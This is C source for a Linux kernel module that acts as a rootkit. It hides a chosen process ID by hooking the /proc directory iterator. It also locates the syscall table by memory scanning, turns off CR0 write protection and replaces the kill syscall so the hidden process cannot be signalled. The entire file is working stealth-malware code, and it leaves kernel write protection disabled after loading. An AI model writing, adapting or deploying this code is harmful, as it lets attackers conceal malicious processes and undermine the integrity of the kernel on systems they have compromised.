#include "hide.h"

static struct file *file = NULL;

static char *pid_hide_char;
module_param(pid_hide_char, charp, 0660);
MODULE_PARM_DESC(pid_hide_char, "Pid to hide");

static int pid_hide_int;
module_param(pid_hide_int, int, 0660);
MODULE_PARM_DESC(pid_hide_int, "Pid to hide");

struct file_operations my_fo;
const struct file_operations *old_fops;

int (*old_actor)(struct dir_context *ctx, const char *name, int nlen,
		loff_t off, u64 ino, unsigned x) = NULL;

asmlinkage unsigned long **syscall_table = NULL;

asmlinkage int (*sys_kill_bk)(pid_t pid, int sig);

int my_actor(struct dir_context *ctx, const char *name, int nlen, loff_t off,
	u64 ino, unsigned x)
{
	if (strcmp(name, pid_hide_char) == 0) 
		return 0;
	else
		return old_actor(ctx, name, nlen, off, ino, x);
}

int my_iterate(struct file *fp, struct dir_context *ctx)
{
	int bk;

	old_actor = ctx->actor;
	ctx->actor = my_actor;

	bk = old_fops->iterate_shared(fp, ctx);

	ctx->actor = old_actor;

	return bk;
}

static asmlinkage int my_sys_kill(pid_t pid, int sig)
{
	pr_warn("My sys kill\n");
	pr_warn("pid = %d, sig = %d, hide = %d\n", pid, sig, pid_hide_int);
	if (pid == pid_hide_int) {
		pr_warn("Intercepted kill\n");
		return -ESRCH;
	}

	pr_warn("Old sys kill for %d\n", pid);
	(*sys_kill_bk)(pid, sig);
	pr_warn("After \n");
	return 0;
	
}

/*static unsigned long find_sys_call_table(void)
{
	return kallsyms_lookup_name("sys32_call_table");
}*/

static unsigned long **find_sys_call_table(void)  {
 
   unsigned long **sctable;
   unsigned long ptr;
   extern int loops_per_jiffy;
 
   sctable = NULL;
   for (ptr = (unsigned long)&loops_per_jiffy;
        ptr < (unsigned long)&boot_cpu_data; 
        ptr += sizeof(void *))
   {
      unsigned long *p;
      p = (unsigned long *)ptr;
      if (p[__NR_close] == (unsigned long) sys_close)
      {
         sctable = (unsigned long **)p;
         return &sctable[0];
      }
   }
 
   return NULL;
}

static int __init hide_init(void)
{
	file = filp_open("/proc", O_RDONLY, 0);
	if(!file)
		goto ERROR1;

	old_fops = file->f_inode->i_fop;
	memcpy(&my_fo, file->f_inode->i_fop, 
		sizeof(struct file_operations));

	my_fo.iterate_shared = my_iterate;

	file->f_inode->i_fop = &my_fo;

	syscall_table = find_sys_call_table();
	pr_warn("table = %p\n\n\n", syscall_table);
	//pr_warn("table[__NR_kill] = %p\n\n\n", syscall_table[__NR_kill]);
	/*syscall_table[__NR_kill] = NULL;
	pr_warn("table after = %x\n\n\n", *syscall_table);
	pr_warn("table[__NR_kill] after = %x\n\n\n", syscall_table[__NR_kill]);*/

	write_cr0(read_cr0() & (~ 0x10000));

	sys_kill_bk = (void *)syscall_table[__NR_kill];
	syscall_table[__NR_kill] = (void *)my_sys_kill;
	
	//write_cr0(read_cr0() | 0x10000);

	pr_warn("table[__NR_kill] = %p\n\n\n", syscall_table[__NR_kill]);

	return 0;

ERROR1:
	return -1;
}

static void __exit hide_exit(void)
{
	pr_warn("I was found out, snap !\n");
	file->f_inode->i_fop = old_fops;

	//write_cr0(read_cr0() & (~ 0x10000));
	
	syscall_table[__NR_kill] = (unsigned long *)sys_kill_bk;
	
	write_cr0(read_cr0() | 0x10000);
}